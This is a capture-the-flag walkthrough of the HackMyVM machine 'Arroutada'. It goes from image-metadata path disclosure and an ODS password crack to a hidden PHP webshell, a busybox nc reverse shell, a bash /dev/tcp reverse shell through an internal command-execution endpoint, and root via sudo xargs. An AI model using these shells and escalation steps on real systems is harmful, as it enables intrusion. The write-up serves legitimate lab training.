# Arroutada

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Arroutada | RiJaba1 | Beginner | HackMyVM |

**Summary:** The Arroutada machine presents a layered web exploitation challenge that begins with a deliberately sparse homepage serving a single PNG image. The critical insight is that the image's ExifTool metadata encodes a hidden filesystem path inside its `Title` field, directing the attacker to a `/scout/` directory. That directory contains an inter-character message that leaks both a partial URL structure (`/scout/******/docs/`) and two probable usernames. Fuzzing the missing path segment uncovers the `j2` subdirectory, which exposes a directory listing containing a credential file and a password-protected OpenDocument Spreadsheet. Standard hash extraction tools fail on the file because its ZIP container is unencrypted while only the document content is protected; `libreoffice2john` correctly handles this format and John the Ripper cracks the password in seconds. The decrypted spreadsheet cell reveals the full path to a hidden PHP webshell on the public web server. The shell requires two specific GET parameters to execute, both of which are discovered through iterative fuzzing. Remote code execution as `www-data` leads to a fully interactive shell, where internal enumeration uncovers a second HTTP service on loopback port 8000. That internal service hosts a PHP endpoint (`priv.php`) that conveniently leaks its own source code in a comment block, revealing that it accepts a JSON POST body and executes the supplied command as user `drito`. A second reverse shell escalates lateral access to `drito`, whose `sudo` privileges are limited to a single binary: `/usr/bin/xargs`. A well-known GTFOBins technique abuses `xargs` to spawn a root shell with no further conditions, completing the full chain from unauthenticated web visitor to system owner.

---

## Reconnaissance

### Host Discovery

The target was discovered on the local network using a custom PowerShell scanner. The machine was identified at `192.168.100.154` with a VirtualBox MAC prefix, confirming it as the intended target.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.154 08:00:27:D9:01:B5 VirtualBox
```

The target IP was stored in a shell variable for convenience throughout the engagement.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ ip=192.168.100.154 && url=http://$ip
```

### Port Scan

A full TCP port scan with service version detection revealed a single attack surface: Apache 2.4.54 on port 80. No SSH or other management interfaces were exposed.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 04:52 WIB
Nmap scan report for 192.168.100.154
Host is up (0.0021s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds
```

---

## Web Enumeration

### Stage 1: Steganographic Path Disclosure via Image Metadata

1. The root page returned a minimal HTML document consisting of nothing but a single embedded image tag pointing to `imgs/apreton.png`. There were no links, forms, or other navigable elements.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Mon, 09 Mar 2026 21:55:02 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Sun, 08 Jan 2023 14:33:23 GMT
ETag: "3b-5f1c188702b98"
Accept-Ranges: bytes
Content-Length: 59
Content-Type: text/html

<div align="center"><img src="imgs/apreton.png"></div>
```

2. The image was downloaded locally and inspected with `exiftool`. The `Title` metadata field contained a JSON-formatted string encoding a hidden server path: `{"path": "/scout"}`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ wget $url/imgs/apreton.png
--2026-03-10 04:59:02--  http://192.168.100.154/imgs/apreton.png
Connecting to 192.168.100.154:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 70806 (69K) [image/png]
Saving to: 'apreton.png'

apreton.png     100%[=======>]  69.15K  --.-KB/s    in 0.03s

2026-03-10 04:59:02 (2.30 MB/s) - 'apreton.png' saved [70806/70806]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ file apreton.png
apreton.png: PNG image data, 1280 x 661, 8-bit gray+alpha, non-interlaced

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ exiftool apreton.png
ExifTool Version Number         : 13.36
File Name                       : apreton.png
Directory                       : .
File Size                       : 71 kB
File Modification Date/Time     : 2023:01:08 21:43:02+07:00
File Access Date/Time           : 2026:03:10 04:59:07+07:00
File Inode Change Date/Time     : 2026:03:10 04:59:02+07:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1280
Image Height                    : 661
Bit Depth                       : 8
Color Type                      : Grayscale with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Title                           : {"path": "/scout"}
Image Size                      : 1280x661
Megapixels                      : 0.846
```

### Stage 2: The Scout Directory and Username Enumeration

3. Navigating to `/scout/` revealed an HTML message from a character named `J1` addressed to `Telly`. The message disclosed a partial URL template, `/scout/******/docs/`, with only the middle path segment unknown. The HTML comments additionally confirmed the author's identity as `J1`. Two likely usernames were extracted: `j1` and `telly`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ curl -i $url/scout/
HTTP/1.1 200 OK
Date: Mon, 09 Mar 2026 21:59:57 GMT
Server: Apache/2.4.54 (Debian)
Last-Modified: Sun, 08 Jan 2023 14:56:34 GMT
ETag: "30b-5f1c1db5a4e26"
Accept-Ranges: bytes
Content-Length: 779
Vary: Accept-Encoding
Content-Type: text/html


<div>
<p>
Hi, Telly,
<br>
<br>
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
<br>
/scout/******/docs/
<br>
<br>
With continued gratitude,
<br>
J1.
</p>
</div>
<!-- Stop please -->
...
<!-- I told you to stop checking on me! -->
...
<!-- OK... I'm just J1, the boss. -->
```

### Stage 3: Directory Fuzzing to Discover the Hidden Path Segment

4. `ffuf` was used to fuzz the unknown middle segment of the URL template, targeting `/scout/FUZZ/docs/`. The tool discovered the valid segment `j2`, yielding the full path `/scout/j2/docs/`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ ffuf -u $url/scout/FUZZ/docs/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -ic -fw 20

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.154/scout/FUZZ/docs/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

j2                      [Status: 200, Size: 189769, Words: 15060, Lines: 1017, Duration: 1840ms]
```

The Apache directory listing at `/scout/j2/docs/` contained two immediately interesting files: `pass.txt` and `shellfile.ods`.

![](image.png)

---

## Credential Recovery and ODS Password Cracking

### Retrieving the Files

5. Both files were downloaded. `pass.txt` contained plaintext credentials in the format `user:password`. The `shellfile.ods` was an OpenDocument Spreadsheet protected by an unknown password.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ wget $url/scout/j2/docs/pass.txt
--2026-03-10 05:12:23--  http://192.168.100.154/scout/j2/docs/pass.txt
Connecting to 192.168.100.154:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14 [text/plain]
Saving to: 'pass.txt'

pass.txt           100%[===============>]      14  --.-KB/s    in 0s

2026-03-10 05:12:23 (871 KB/s) - 'pass.txt' saved [14/14]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ wget $url/scout/j2/docs/shellfile.ods
--2026-03-10 05:12:39--  http://192.168.100.154/scout/j2/docs/shellfile.ods
Connecting to 192.168.100.154:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11821 (12K) [application/vnd.oasis.opendocument.spreadsheet]
Saving to: 'shellfile.ods'

shellfile.ods      100%[===============>]  11.54K  --.-KB/s    in 0s

2026-03-10 05:12:39 (23.0 MB/s) - 'shellfile.ods' saved [11821/11821]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ cat pass.txt
user:password

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ file shellfile.ods
shellfile.ods: OpenDocument Spreadsheet
```

The directory listing also showed several `z*` files with zero byte sizes, except for `z206` which contained 27 bytes.

![](image-1.png)

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ wget $url/scout/j2/docs/z206
--2026-03-10 05:15:21--  http://192.168.100.154/scout/j2/docs/z206
Connecting to 192.168.100.154:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27
Saving to: 'z206'

z206               100%[===============>]      27  --.-KB/s    in 0s

2026-03-10 05:15:21 (1.98 MB/s) - 'z206' saved [27/27]


┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ cat z206
Ignore z*, please
Jabatito
```

### Cracking the ODS File

6. Standard hash extraction methods both failed. `office2john.py` rejected the file because its ZIP container is unencrypted (only the document content is protected), and `zip2john` confirmed the internal files were not individually encrypted either.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ python3 /usr/share/john/office2john.py shellfile.ods > ods_hash.txt
shellfile.ods : zip container found, file is unencrypted?, invalid OLE file!
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ zip2john shellfile.ods > zip_hash.txt
ver 2.0 shellfile.ods/mimetype is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/accelerator/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/images/Bitmaps/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/toolpanel/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/progressbar/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/statusbar/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/toolbar/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/floater/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/popupmenu/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/Configurations2/menubar/ is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/manifest.rdf is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/meta.xml is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/styles.xml is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/content.xml is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/settings.xml is not encrypted, or stored with non-handled compression type
ver 2.0 shellfile.ods/META-INF/manifest.xml is not encrypted, or stored with non-handled compression type
```

7. `libreoffice2john` was the correct tool, as it handles the ODF encryption layer directly. It successfully extracted a hash using the PBKDF2-SHA1 key derivation function with AES encryption. John the Ripper cracked the password in just over two minutes against `rockyou.txt`, recovering the password `j[REDACTED]`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ libreoffice2john shellfile.ods > ods.hash

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ods.hash
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 256/256 AVX2 8x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
j[REDACTED]           (shellfile.ods)
1g 0:00:02:04 DONE (2026-03-10 05:28) 0.008030g/s 132.8p/s 132.8c/s 132.8C/s lachina..emmanuel1
Use the "--show --format=ODF" options to display all of the cracked passwords reliably
Session completed.
```

8. Opening `shellfile.ods` in LibreOffice Calc with password `j[REDACTED]` revealed the document's contents. Cell H7 contained the path `/thejabasshell.php`, which the spreadsheet author had labelled "PATH:" in the adjacent cell.

![](image-2.png)

---

## Initial Access: Webshell Parameter Discovery and RCE

### Discovering the Required Parameters

9. The PHP file at `/thejabasshell.php` returned no content by default, indicating it required specific GET parameters to function. `ffuf` was used to fuzz for the first parameter name by injecting a known command value (`id`) and filtering out empty responses. The parameter `a` was identified.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ ffuf -u $url/thejabasshell.php?FUZZ=id -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -ic  -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.154/thejabasshell.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 8ms]
```

10. Testing `?a=id` produced an error indicating a missing second parameter `b`. Supplying any value for `b` still returned the same error, meaning the shell validated the value of `b` as well. A second `ffuf` pass, this time fuzzing the `b` parameter while fixing `a=id`, identified the required value: `pass`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ curl $url/thejabasshell.php?a=id
Error: Problem with parameter "b"
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ curl "$url/thejabasshell.php?a=id&b=id"
Error: Problem with parameter "b"
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ ffuf -u "$url/thejabasshell.php?a=id&b=FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -ic  -fs 33

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.154/thejabasshell.php?a=id&b=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 33
________________________________________________

pass                    [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 262ms]
```

11. With both parameters confirmed, arbitrary command execution was verified. The server responded with the `www-data` context.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ curl "$url/thejabasshell.php?a=id&b=pass"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Establishing a Reverse Shell as www-data

12. A `netcat` listener was started, and the webshell was used to invoke `busybox nc` for a reverse shell. Once connected, the TTY was upgraded using `script` and `stty`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ curl "$url/thejabasshell.php?a=busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash&b=pass"
```

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 51391
which python3
/usr/bin/script -qc /bin/bash /dev/null
www-data@arroutada:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@arroutada:/var/www/html$ export SHELL=/bin/bash
www-data@arroutada:/var/www/html$ export TERM=xterm-256color
www-data@arroutada:/var/www/html$ stty rows 67 cols 137
```

---

## Internal Enumeration

### User and Service Discovery

13. Reading `/etc/passwd` revealed a single non-root interactive user: `drito`. Access to their home directory was denied from the `www-data` context.

```bash
www-data@arroutada:/var/www/html$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
drito:x:1001:1001::/home/drito:/bin/bash
www-data@arroutada:/var/www/html$ ls -la /home/drito/
ls: cannot open directory '/home/drito/': Permission denied
```

14. The system crontab revealed that `drito` executes `/home/drito/service` every minute. Network socket enumeration with `ss` also showed an HTTP service listening exclusively on `127.0.0.1:8000`.

```bash
www-data@arroutada:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * drito /home/drito/service
www-data@arroutada:/$ ss -tlpn
State           Recv-Q          Send-Q                   Local Address:Port                   Peer Address:Port         Process
LISTEN          0               4096                         127.0.0.1:8000                        0.0.0.0:*
LISTEN          0               511                                  *:80                                *:*
```

### Probing the Internal HTTP Service

15. Fetching the root of the internal service at port 8000 returned an HTML page with a Brainfuck-encoded string in the body and, crucially, an HTML comment instructing anyone who finds it to sanitize the `/priv.php` endpoint.

```bash
www-data@arroutada:/tmp$ wget http://localhost:8000
--2026-03-09 19:34:07--  http://localhost:8000/
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:8000... failed: Connection refused.
Connecting to localhost (localhost)|127.0.0.1|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 319 [text/html]
Saving to: 'index.html'

index.html                         100%[=============================================================>]     319  --.-KB/s    in 0s

2026-03-09 19:34:07 (9.00 MB/s) - 'index.html' saved [319/319]

www-data@arroutada:/tmp$ cat index.html
<h1>Service under maintenance</h1>


<br>


<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

16. Fetching `/priv.php` returned an error message alongside the PHP source code itself, leaked in a comment block. The code reads a JSON body from `php://input` and passes the `command` key directly to `system()`. Since the crontab confirms this service runs as `drito`, this endpoint provides unauthenticated command execution in that user's context.

```bash
www-data@arroutada:/tmp$ wget http://localhost:8000/priv.php
--2026-03-09 19:35:07--  http://localhost:8000/priv.php
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:8000... failed: Connection refused.
Connecting to localhost (localhost)|127.0.0.1|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'priv.php'

priv.php                               [ <=>                                                          ]     308  --.-KB/s    in 0s

2026-03-09 19:35:07 (3.29 MB/s) - 'priv.php' saved [308]

www-data@arroutada:/tmp$ cat priv.php
Error: the "command" parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

17. Execution was confirmed by posting `id` as the command value, which returned `drito`'s UID.

```bash
www-data@arroutada:/tmp$ wget --post-data='{"command":"id"}' --header='Content-Type:application/json' http://localhost:8000/priv.php -q -O -
uid=1001(drito) gid=1001(drito) groups=1001(drito)


/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

---

## Lateral Movement: www-data to drito

18. A second listener was opened on port 8888. The internal `priv.php` endpoint was used to deliver a bash reverse shell, establishing a session as `drito`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

```bash
www-data@arroutada:/tmp$ wget --post-data='{"command":"bash -c \"bash -i >& /dev/tcp/192.168.100.1/8888 0>&1\""}' --header='Content-Type:application/json' http://localhost:8000/priv.php -qO -
```

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 51503
bash: cannot set terminal process group (437): Inappropriate ioctl for device
bash: no job control in this shell
drito@arroutada:~/web$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
drito@arroutada:~/web$ ^Z
zsh: suspended  nc -lvnp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/arroutada]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 8888

drito@arroutada:~/web$ export SHELL=/bin/bash
drito@arroutada:~/web$ export TERM=xterm-256color
drito@arroutada:~/web$ stty rows 83 cols 167
```

---

## Privilege Escalation: drito to root via xargs

19. Checking `drito`'s `sudo` permissions revealed a single allowed command: `/usr/bin/xargs` with full `NOPASSWD` privileges as any user.

```bash
drito@arroutada:~/web$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

20. The GTFOBins entry for `xargs` documents that `xargs -a /dev/null /bin/sh` spawns an interactive shell inheriting the caller's privileges. Running this with `sudo` and substituting `/bin/bash` produced an immediate root shell.

![](image-3.png)

```bash
drito@arroutada:~/web$ sudo /usr/bin/xargs -a /dev/null /bin/bash
root@arroutada:/home/drito/web# cd
root@arroutada:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
arroutada
```

### Flags

21. Both flags were read from their respective home directories. The root flag was additionally encoded: first as Base64, then as ROT13, requiring two decoding passes to reveal the final plaintext value.

```bash
root@arroutada:~# cat /home/drito/user.txt /root/root.txt
785[REDACTED]
R3V[REDACTED]
root@arroutada:~# echo 'R3V[REDACTED]' | base64 -d ; echo ''
Gun[REDACTED]
root@arroutada:~# echo 'Gun[REDACTED]' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Tha[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: Full TCP scan revealed a single open port, Apache 2.4.54 on port 80, providing the sole attack surface for the entire engagement.
2. **Vulnerability Discovery**: The homepage image's ExifTool `Title` metadata disclosed the `/scout` path. The `/scout/` page leaked a URL template that, when fuzzed, revealed the hidden subdirectory `j2` and the files within `/scout/j2/docs/`.
3. **Exploitation**: `libreoffice2john` extracted an ODF hash from the password-protected spreadsheet, which John the Ripper cracked to `j[REDACTED]`. The decrypted file disclosed the path to a two-parameter PHP webshell. Iterative `ffuf` fuzzing identified both parameters (`a` for the command, `b=pass` as the required passphrase), enabling remote code execution and a reverse shell as `www-data`.
4. **Internal Enumeration**: The crontab exposed a service running as `drito` every minute, and `ss` revealed an internal HTTP server on port 8000. The `/priv.php` endpoint on that server leaked its own PHP source code, confirming it executes POST-supplied JSON commands as `drito` with no authentication.
5. **Privilege Escalation**: Lateral movement to `drito` was achieved by posting a bash reverse shell payload to the internal endpoint. From there, `sudo -l` revealed passwordless `xargs` access. The GTFOBins technique `sudo xargs -a /dev/null /bin/bash` immediately spawned a root shell, completing full system compromise.
